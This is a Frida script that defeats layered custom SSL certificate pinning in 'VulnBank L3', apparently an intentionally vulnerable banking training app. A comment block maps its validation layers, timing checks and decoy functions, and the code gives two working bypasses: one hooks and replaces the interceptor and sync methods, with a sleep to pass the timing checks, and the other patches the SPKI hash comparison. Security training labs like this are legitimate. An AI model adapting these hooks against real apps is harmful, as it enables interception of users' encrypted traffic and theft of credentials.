/**
 * Frida bypass script for VulnBank L3 (custom) SSL pinning
 *
 * Usage:
 *   frida -U -f com.vulnerablebankapp.l3 -l frida-bypass-custom.js
 *
 * Architecture overview:
 *   The L3 build has three validation layers:
 *     1. DataSyncManager.ensureConfigSync() — HttpsURLConnection SPKI check (native)
 *     2. ConfigInterceptor.intercept()       — OkHttp interceptor SPKI check (native)
 *     3. JS timing check in httpClient.ts    — Date.now() threshold (30ms)
 *
 *   Plus timing anti-tamper:
 *     - Native: ensureConfigSync rejects if elapsed < 50ms
 *     - JS: httpClient.ts rejects if ensureConfigSync resolves in < 30ms
 *
 *   Plus sticky flags:
 *     - Native: sessionIntegrity (once false, stays false)
 *     - JS: sessionCompromised (once true, blocks all requests)
 *
 *   Plus decoy honeypot functions (hooking these does NOT bypass pinning):
 *     - validateCertificate()    — does a real TLS connection but result is unused
 *     - checkSSLPinning()        — always returns true (stub)
 *     - verifyCertificateChain() — always returns true (stub)
 *
 * ============================================================================
 * NAIVE ATTEMPT (DOES NOT WORK)
 * ============================================================================
 *
 * A typical automated Frida script would grep for "SSL", "pinning",
 * "certificate" in method names and hook:
 *
 *   - checkSSLPinning()        → already returns true, hooking is a no-op
 *   - verifyCertificateChain() → already returns true, hooking is a no-op
 *   - validateCertificate()    → decoy, result doesn't gate any request
 *
 * The real validation lives in ensureConfigSync() and ConfigInterceptor —
 * names that don't suggest certificate pinning.
 *
 * ============================================================================
 * WORKING BYPASS
 * ============================================================================
 *
 * Two approaches shown below. Approach A is simpler but uses a sleep to
 * defeat timing checks. Approach B is stealthier — it lets the real TLS
 * handshake run (natural timing) and only patches the hash comparison.
 */

// --------------------------------------------------------------------------
// Approach A: Replace validation entirely
// --------------------------------------------------------------------------
// Pros: simple, no dependency on internal methods
// Cons: Thread.sleep is a blunt instrument; detectable by more advanced checks

function bypassApproachA() {
    Java.perform(function () {
        console.log("[*] L3 bypass (Approach A): replacing validation methods");

        // Layer 1: Bypass ConfigInterceptor — skip SPKI check, just forward
        var ConfigInterceptor = Java.use(
            "com.vulnerablebankapp.network.ConfigInterceptor"
        );
        ConfigInterceptor.intercept.implementation = function (chain) {
            console.log("[*] ConfigInterceptor bypassed: " + chain.request().url());
            return chain.proceed(chain.request());
        };

        // Layer 2: Bypass ensureConfigSync — resolve promise after delay
        // The 100ms sleep defeats both timing checks:
        //   - Native 50ms threshold (skipped entirely since we replace the method)
        //   - JS 30ms threshold (Date.now() sees ~100ms elapsed)
        var DataSyncManager = Java.use(
            "com.vulnerablebankapp.network.DataSyncManager"
        );
        DataSyncManager.ensureConfigSync.implementation = function (
            domain,
            pinHash,
            promise
        ) {
            console.log("[*] ensureConfigSync bypassed for: " + domain);
            Java.use("java.lang.Thread").sleep(100);
            promise.resolve(null);
        };

        console.log("[+] L3 SSL pinning bypass active (Approach A)");
    });
}

// --------------------------------------------------------------------------
// Approach B: Patch hash computation (stealthier)
// --------------------------------------------------------------------------
// Pros: real TLS handshake runs (natural timing, no sleep needed),
//       harder to detect since all code paths execute normally
// Cons: relies on hooking private method computeSpkiHash

function bypassApproachB() {
    Java.perform(function () {
        console.log("[*] L3 bypass (Approach B): patching SPKI hash computation");

        // Capture the expected pin hash from the first ensureConfigSync call
        var expectedHash = null;

        var DataSyncManager = Java.use(
            "com.vulnerablebankapp.network.DataSyncManager"
        );

        // Intercept ensureConfigSync just to capture the pinHash argument
        DataSyncManager.ensureConfigSync.implementation = function (
            domain,
            pinHash,
            promise
        ) {
            expectedHash = pinHash;
            console.log("[*] Captured pin hash: " + pinHash);
            // Call the original — it will use our patched computeSpkiHash below
            this.ensureConfigSync(domain, pinHash, promise);
        };

        // Patch computeSpkiHash in DataSyncManager to return the expected hash
        // The real TLS handshake still runs (passing timing checks naturally),
        // but the hash comparison always succeeds
        DataSyncManager.computeSpkiHash.implementation = function (cert) {
            var realHash = this.computeSpkiHash(cert);
            console.log("[*] DataSyncManager SPKI: " + realHash + " -> " + expectedHash);
            return expectedHash || realHash;
        };

        // Patch computeSpkiHash in ConfigInterceptor to return the pinned hash
        var ConfigInterceptor = Java.use(
            "com.vulnerablebankapp.network.ConfigInterceptor"
        );

        // Read the pinnedHash field from the interceptor instance
        ConfigInterceptor.computeSpkiHash.implementation = function (cert) {
            var pinned = this.pinnedHash.value;
            var realHash = this.computeSpkiHash(cert);
            console.log("[*] ConfigInterceptor SPKI: " + realHash + " -> " + pinned);
            return pinned;
        };

        console.log("[+] L3 SSL pinning bypass active (Approach B)");
    });
}

// --------------------------------------------------------------------------
// Pick one:
// --------------------------------------------------------------------------
bypassApproachA();
// bypassApproachB();
